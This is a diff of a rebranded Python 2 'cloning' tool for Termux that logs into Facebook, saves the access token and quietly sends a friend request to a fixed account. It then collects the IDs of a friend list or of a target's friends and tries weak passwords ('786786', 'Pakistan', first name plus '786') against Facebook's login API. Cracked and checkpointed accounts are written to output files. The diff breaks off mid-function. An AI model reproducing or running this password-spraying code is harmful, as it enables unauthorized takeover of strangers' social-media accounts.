@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Rameez Sarwar
+#The Credit For This Code Goes To lovehacker
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -46,50 +46,24 @@ def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
-		time.sleep(0.01)
+		time.sleep(0.07)
 
-#Dev:Rameez Sarwar
+#Dev:love_hacker
 ##### LOGO #####
 logo = """
-\033[1;96m╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮
-\033[1;96m┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭━╮┃
-\033[1;96m┃╰━╯┣━━┳╮╭┳━━┳━━┳━━━╮┃╰━━┳━━┳━┳╮╭╮╭┳━━┳━╮
-\033[1;96m┃╭╮╭┫╭╮┃╰╯┃┃━┫┃━╋━━┃┃╰━━╮┃╭╮┃╭┫╰╯╰╯┃╭╮┃╭╯
-\033[1;96m┃┃┃╰┫╭╮┃┃┃┃┃━┫┃━┫┃━━┫┃╰━╯┃╭╮┃┃╰╮╭╮╭┫╭╮┃┃
-\033[1;96m╰╯╰━┻╯╰┻┻┻┻━━┻━━┻━━━╯╰━━━┻╯╰┻╯╱╰╯╰╯╰╯╰┻╯
-                      _____ 
-            ¸,.-~·*¨.::::::::::¨*·~-.,¸ 
-      ¸.· ´::::::´: . · .¨             ::` ·.¸ 
-   ¸·´,;':::::::' :· .     ·   .  :      ::::::`·¸ 
- ¸·;;;;'::::::: · . :'      ·    .     .  :::::::::·¸ 
-,;;;;;;:::::::.:. ·         ·     :       :::::::::::.   
-;;;;;;;;::::::..· :´  .       '     ·     .:::::::::::::                                        
-';;;;;;;;,:::'::·.......¸.·::·.¸.......::::::::::::::::: 
- ';;;;;;;;;;;;;;,,¸:::::::::;::::::::::::::::::::::::::' 
-'  ';.¸.-·~·-.,¸;;;;;;,:::´`:::::::::::¸,.-·~·-.¸.::' 
-    ;;`·.¸      ¯¨*·.¸';;.'::::.¸.·*¨¯       ¸.·´:: 
-    ';;:::'`·.¸●       ')`:::::(     ●   ¸.·´::: 
-     `·.::::::`·--·´ :::::: `·-·´ .::::·´::: 
-         `·,;;:::.  :·:´ø· ø `. ::. ' ·.:::·´ 
-            `·-.:::.·: ::.:.: · : :::::.-·´ 
-               '`·.::.·-~ .::·´::::: 
-                 )`·.:.  : . ·.::·´( 
-                /',; '`··´  :.'\ 
-   _¸.·´,;;;             .:::.`·.¸_ 
-.·´   |`:¯'`: |`:¯`:    |`:¯'`: |`·.¯¯¯¯`·´¯('|`:¯`·.  |`:¯: 
-    .·´ .·´|`·.`:   :    `':   :  `·.`·.`·.¯`·.·´|'`: :`·.`·.
-.·´  .·´__|   `·. :      |`·. `·.  `·. )  `>|.·'  : :`·.`·.`'
-:    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.:  : 
-|`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_.| 
-`·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
-   |___'|.·´    Rameez Sarwar ITX RAMI     -«
-\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mRameezSarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
-\033[1;96m:•◈•-----𝕀𝕋𝕏 ℝ𝔸𝕄𝕀---------
-\033[1;96m:•◈•-----𝕀𝕋𝕏 ℝ𝔸𝕄𝕀---------
-\033[1;96m:•◈•-----𝕀𝕋𝕏 ℝ𝔸𝕄𝕀---------
-\033[1;96m:•◈•-----𝕀𝕋𝕏 ℝ𝔸𝕄𝕀---------
-\033[1;96m:•◈•-----𝕀𝕋𝕏 ℝ𝔸𝕄𝕀---------
-\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mRameez Sarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
+\033[1;97m ❥▦▦▦▦B▦▦▦▦▦▦❥▦❥▦▦▦▦▦❥▦❥▦▦▦▦▦▦L▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;97m ❥▦▦▦▦L▦▦▦▦▦❥▦▦▦❥▦▦▦❥▦▦▦▦❥▦▦▦▦O▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;97m ❥▦▦▦▦A▦▦▦▦❥▦▦▦▦▦❥▦❥▦▦▦▦▦▦❥▦▦▦V▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;97m ❥▦▦▦▦C▦▦▦▦❥▦▦▦▦▦▦❥▦▦▦▦▦▦▦❥▦▦▦E▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;97m ❥▦▦▦▦K▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;93m ❥▦▦▦▦▦▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦H▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;93m ❥▦▦▦▦M▦▦▦▦▦▦❥▦▦▦▦▦▦▦▦▦❥▦▦▦▦▦A▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;93m ❥▦▦▦▦A▦▦▦▦▦▦▦❥▦▦▦▦▦▦▦❥▦▦▦▦▦▦C▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;93m ❥▦▦▦▦F▦▦▦▦▦▦▦▦❥▦▦▦▦▦❥▦▦▦▦▦▦▦K▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;93m ❥▦▦▦▦I▦▦▦▦▦▦▦▦▦❥▦▦▦❥▦▦▦▦▦▦▦▦E▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;93m ❥▦▦▦▦A▦▦▦▦▦▦▦▦▦▦❥▦❥▦▦▦▦▦▦▦▦▦R▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;93m ❥▦▦▦▦▦▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥• \033[1;97m●BlackMafia●\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -108,88 +82,46 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;96m╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮
-\033[1;96m┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭━╮┃
-\033[1;96m┃╰━╯┣━━┳╮╭┳━━┳━━┳━━━╮┃╰━━┳━━┳━┳╮╭╮╭┳━━┳━╮
-\033[1;96m┃╭╮╭┫╭╮┃╰╯┃┃━┫┃━╋━━┃┃╰━━╮┃╭╮┃╭┫╰╯╰╯┃╭╮┃╭╯
-\033[1;96m┃┃┃╰┫╭╮┃┃┃┃┃━┫┃━┫┃━━┫┃╰━╯┃╭╮┃┃╰╮╭╮╭┫╭╮┃┃
-\033[1;96m╰╯╰━┻╯╰┻┻┻┻━━┻━━┻━━━╯╰━━━┻╯╰┻╯╱╰╯╰╯╰╯╰┻╯
-\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mRameez Sarwar\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
-jalan("\033[1;96m----------------------//\\")
-jalan("\033[1;96m---------------------// ¤ \\")
-jalan("\033[1;96m---------------------\\ ¤ //")
-jalan("\033[1;96m---------------------- \\//")
-jalan("\033[1;96m-------------------- (___)")
-jalan("\033[1;96m---------------------(___)")
-jalan("\033[1;96m---------------------(___)")
-jalan("\033[1;96m---------------------(___)_________")
-jalan("\033[1;96m--------\_____/\__/----\__/\_____/")
-jalan("\033[1;96m------------\ _°_[------------]_ _° /")
-jalan("\033[1;96m----------------\_°_¤ ---- ¤_°_/")
-jalan("\033[1;96m--------------------\ __°__ /")
-jalan("\033[1;96m---------------------|\_°_/|")
-jalan("\033[1;96m---------------------[|\_/|]")
-jalan("\033[1;96m---------------------[|[¤]|]")
-jalan("\033[1;96m---------------------[|;¤;|]")
-jalan("\033[1;96m---------------------[;;¤;[]")
-jalan("\033[1;96m--------------------;;;;¤][]\ ")
-jalan("\033[1;96m-------------------;;;;;¤][]-\ ")
-jalan("\033[1;96m------------------;;;;;[¤][]--\ ")
-jalan("\033[1;96m-----------------;;;;;|[¤][]---\ ")
-jalan("\033[1;96m----------------;;;;;[|[¤][]|---| ")
-jalan("\033[1;96m---------------;;;;;[|[¤]|]|---| ")
-jalan("\033[1;96m----------------;;;;[|[¤]|/---/ ")
-jalan("\033[1;96m-----------------;;;[|[¤]/---/ ")
-jalan("\033[1;96m------------------;;[|[¤/---/ ")
-jalan("\033[1;96m-------------------;[|[/---/ ")
-jalan("\033[1;96m--------------------[|/---/ ")
-jalan("\033[1;96m---------------------/---/ ")
-jalan("\033[1;96m--------------------/---/|] ")
-jalan("\033[1;96m-------------------/---/]|];")
-jalan("\033[1;96m------------------/---/¤]|];;")
-jalan("\033[1;96m-----------------|---|[¤]|];;;")
-jalan("\033[1;96m-----------------|---|[¤]|];;;")
-jalan("\033[1;96m------------------\--|[¤]|];;")
-jalan("\033[1;96m-------------------\-|[¤]|]; ")
-jalan("\033[1;96m---------------------\|[¤]|] ")
-jalan("\033[1;96m----------------------\\¤// ")
-jalan("\033[1;96m-----------------------\|/ ")
-jalan("\033[1;96m------------------------V ")                                     
-jalan("\033[1;96m------------------------------------")
-jalan("\033[1;96m------------ᏒᏗᎷᏋᏋZ ᏕᏗᏒᏇᏗᏒ--------------")
-jalan("\033[1;96m██╗████████╗██╗░░██╗")
-jalan("\033[1;96m██║╚══██╔══╝╚██╗██╔╝")
-jalan("\033[1;96m██║░░░██║░░░░╚███╔╝░")
-jalan("\033[1;96m██║░░░██║░░░░██╔██╗░")
-jalan("\033[1;96m██║░░░██║░░░██╔╝╚██╗")
-jalan("\033[1;96m╚═╝░░░╚═╝░░░╚═╝░░╚═╝")
-jalan("\033[1;96m██████╗░░█████╗░███╗░░░███╗██╗")
-jalan("\033[1;96m██╔══██╗██╔══██╗████╗░████║██║")
-jalan("\033[1;96m██████╔╝███████║██╔████╔██║██║")
-jalan("\033[1;96m██╔══██╗██╔══██║██║╚██╔╝██║██║")
-jalan("\033[1;96m██║░░██║██║░░██║██║░╚═╝░██║██║")
-jalan("\033[1;96m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝")
-jalan('\033[1;93m Welcome to ALL FACEBOOK TRICKS AND FREE HELPING ZONES OWNER RAMEEZ SARWAR ITX RAMI')
-print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mrameezsarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+ \033[1;97m ❥•❥•❥•❥••┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈❥•❥•❥•❥••         
+ \033[1;97m ❥•❥•❥•❥••┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈❥•❥•❥•❥••        
+ \033[1;97m ❥•❥•❥•❥••┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈❥•❥•❥•❥••   
+ \033[1;93m ❥•❥•❥•❥••┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈❥•❥•❥•❥••   
+ \033[1;93m ❥•❥•❥•❥••┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈❥•❥•❥•❥••
+ \033[1;93m ❥•❥•❥•❥••┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈❥•❥•❥•❥••
+ \033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥••
+ \033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥•Welcome To BlackMafia❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;93mBlackMafia\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•
+\033[1;97mAuthor\033[1;97m    :❥•❥•❥•❥• \033[1;97mlovehacker
+\033[1;97mBlackMafia\033[1;97m:❥•❥•❥•❥• \033[1;97▒▓██████████████]99.9
+\033[1;93mFacebook\033[1;93m  :❥•❥•❥•❥• \033[1;93mAsif.Javed
+\033[1;93mWhatsapp\033[1;93m  :❥•❥•❥•❥• \033[1;93m+923094161457
+\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mBlackMafia\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"""
+jalan('\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•BlackMafia❥•❥•❥•❥•❥•❥•❥•❥•:')
+jalan("\033[1;97m ❥•❥•❥•❥••┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈❥•❥•❥•❥• ")
+jalan('\033[1;97m ❥•❥•❥•❥••┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈❥•❥•❥•❥• ')
+jalan('\033[1;93m ❥•❥•❥•❥••┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈❥•❥•❥•❥• ')
+jalan("\033[1;93m ❥•❥•❥•❥••┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈❥•❥•❥•❥• ")
+jalan("\033[1;93m ❥•❥•❥•❥••┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈❥•❥•❥•❥• ")
+print "\033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥╱▔▔▔▔┊┊┊┊▔▔▔▔╲❥•❥•❥•❥•\033[1;97mLogin BlackMafia\033[1;93m•❥•❥•❥•❥•❥•❥•❥•❥•"
 
-CorrectUsername = "rameezsarwar"
-CorrectPassword = "itxrami"
+CorrectUsername = "BlackMafiaGang"
+CorrectPassword = "lovehacker"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;97m📋 \x1b[1;96mTool Username \x1b[1;97m»» \x1b[1;97m")
+    username = raw_input("\033[1;97m🔐 \x1b[1;93mTool Username \x1b[1;97m»» \x1b[1;93m")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;97m🗝 \x1b[1;96mTool Password \x1b[1;97m»» \x1b[1;97m")
+    	password = raw_input("\033[1;97m🔐 \x1b[1;93mTool Password \x1b[1;97m»» \x1b[1;93m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Rameez Sarwar
+            print "Logged in successfully as " + username #Dev:love_hacker
 	    time.sleep(2)
             loop = 'false'
         else:
-            print "\033[1;96mWrong Password"
-            os.system('xdg-open https://m.facebook.com/groups/glenncarlo8/')
+            print "\033[1;91mWrong Password"
+            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
     else:
-        print "\033[1;96mWrong Username"
-        os.system('xdg-open https://m.facebook.com/groups/glenncarlo8/')
+        print "\033[1;94mWrong Username"
+        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 
 def login():
 	os.system('clear')
@@ -199,20 +131,18 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;93mWarning: \033[1;96mDo Not Use Your Personal Account' )
-		jalan(' \033[1;93mWarning: \033[1;96mAlways Use a New Account To Login' )
-		jalan(' \033[1;93mWarning: \033[1;96mWear mask wash your hand and stay at home' )
-		jalan(' \033[1;93mWarning: \033[1;96mTermux  All version Work✅' )                 
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mRameez Sarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
+		jalan(' \033[1;91mWarning: \033[1;93mTermux Old Version Install 0.63 to 0.83' )
+		jalan(' \033[1;91m   Note: \033[1;93mUse a New Account To Login' )
+		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mBlackMafia\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
+		print('	   \033[1;97m■\x1b[1;93m❥•❥•❥•❥••LOGIN WITH FACEBOOK❥•❥•❥•❥••\x1b[1;97m■' )
 		print('	' )
-		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
-		pwd = raw_input('\033[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
+		id = raw_input('\033[1;97m[+] \x1b[1;93mID/Email\x1b[1;97m: \x1b[1;93m')
+		pwd = raw_input('\033[1;97m[+] \x1b[1;93mPassword\x1b[1;97m: \x1b[1;93m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\x1b[1;97mThere is no internet connection"
+			print"\n\x1b[1;96mThere is no internet connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -234,20 +164,20 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;96mLogin Successful.•◈•..'
-				os.system('xdg-open https://m.facebook.com/rameez.sarwar.official')
+				print '\n\x1b[1;95mLogin Successful...'
+				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
+				print"\n\x1b[1;91mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;97mYour Account is on Checkpoint")
+			print("\n\x1b[1;91mYour Account is on Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;94mPassword/Email is wrong")
+			print("\n\x1b[1;93mPassword/Email is wrong")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -259,7 +189,7 @@ def menu():
 		toket=open('login.txt','r').read()
 	except IOError:
 		os.system('clear')
-		print"\x1b[1;94mToken invalid"
+		print"\x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -270,28 +200,28 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print"\033[1;91mYour Account is on Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;94mThere is no internet connection"
+		print"\x1b[1;97mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Rameez Sarwar
+	os.system("clear") #Dev:love_hacker
 	print logo
-	print "  \033[1;97m«----•◈••◈•----\033[1;93mLogged in User Info\033[1;97m----•◈••◈•-----»"
-	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
-	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mRameez Sarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;96mStart Cloning..."
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mlogout            "
+	print "  \033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mLogged in User Info\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
+	print "	   \033[1;97m Name\033[1;93m:\033[1;93m"+nama+"\033[1;97m               "
+	print "	   \033[1;97m ID\033[1;93m  :\033[1;93m"+id+"\x1b[1;97m              "
+	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mBlackMafia\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
+	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;93mStart Cloning..."
+	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
 
 
 def pilih():
-	unikers = raw_input("\n\033[1;96mChoose an Option>>> \033[1;97m")
+	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
 	if unikers =="":
-		print "\x1b[1;97mFill in correctly"
+		print "\x1b[1;91mFill in correctly"
 		pilih()
 	elif unikers =="1":
 		super()
@@ -310,28 +240,27 @@ def super():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\x1b[1;94mToken invalid"
+		print"\x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;96mClone From Friend List."
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;96mClone Friend List Public ID."
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96mTarget Account."
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mBack"
+	print "\033[1;97m--\033[1;97m> \033[1;93m1.\x1b[1;93mClone From Friend List..."
+	print "\033[1;97m--\033[1;97m> \033[1;93m2.\x1b[1;93mClone From Public ID..."
+	print "\033[1;97m--\033[1;97m> \033[1;97m0.\033[1;97mBack"
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;96mChoose an Option>>> \033[1;97m")
+	peak = raw_input("\n\033[1;93mChoose an Option>>> \033[1;97m")
 	if peak =="":
-		print "\x1b[1;94mFill in correctly"
+		print "\x1b[1;91mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mrameezsarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-		jalan('\033[1;94mGetting IDs \033[1;94m...')
+		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mBlackMafia\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
+		jalan('\033[1;97mGetting IDs \033[1;93m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -339,17 +268,17 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;97m[•◈•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mrameezsarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		idt = raw_input("\033[1;93m[♡] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
+		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mBlackMafia\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;97mName\033[1;97m:\033[1;96m "+op["name"]
+			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
 		except KeyError:
-			print"\x1b[1;97mID Not Found!"
-			raw_input("\n\033[1;97m[\033[1;93mBack\033[1;97m]")
+			print"\x1b[1;93mID Not Found!"
+			raw_input("\n\033[1;97m[\033[1;91mBack\033[1;97m]")
 			super()
-		print"\033[1;94mGetting IDs\033[1;97m..."
+		print"\033[1;93mGetting IDs\033[1;93m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -360,15 +289,15 @@ def pilih_super():
 		print "\x1b[1;97mFill in correctly"
 		pilih_super()
 	
-	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
-	jalan('\033[1;94mPlease Wait\033[1;94m...')
+	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
+	jalan('\033[1;93mPlease Wait\033[1;93m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;97m«--•◈••◈•---\x1b[1;93m•◈•Stop Process Press CTRL+Z•◈•\033[1;97m---•◈••◈•-»"
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mrameezsarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	jalan(' \033[1;97m.................\033[1;93mCloning Start..\033[1;97m............ ')
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mrameezsarwar\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+	print "\n\033[1;97m«-----\x1b[1;93m■To Stop Process Press CTRL+Z■\033[1;97m----»"
+	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;93mBlackMafia\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
+	jalan(' \033[1;97m ❥•❥•❥•❥•❥•❥•❥•❥•Cloning Start plzzz Wait❥•❥•❥•❥•❥•❥•❥•❥• ')
+	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mBlackMafia\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
 	
 			
 	def main(arg):
@@ -377,89 +306,89 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:RAMEEZ SARWAR
+			pass #Dev:love_hacker
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = b['first_name'] + b['last_name']
+			pass1 = ('786786')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass1
+				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass1
+					print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
 					cek = open("out/checkpoint.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = '786786'
+					pass2 = ('Pakistan')
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass2
+						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m▬\x1b[1;97m-' + user + '-\x1b[1;96m▬\x1b[1;97m-' + pass2
+							print '\x1b[1;93mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
 							cek = open("out/checkpoint.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = 'Pakistan'
+							pass3 = a['first_name'] + '786'
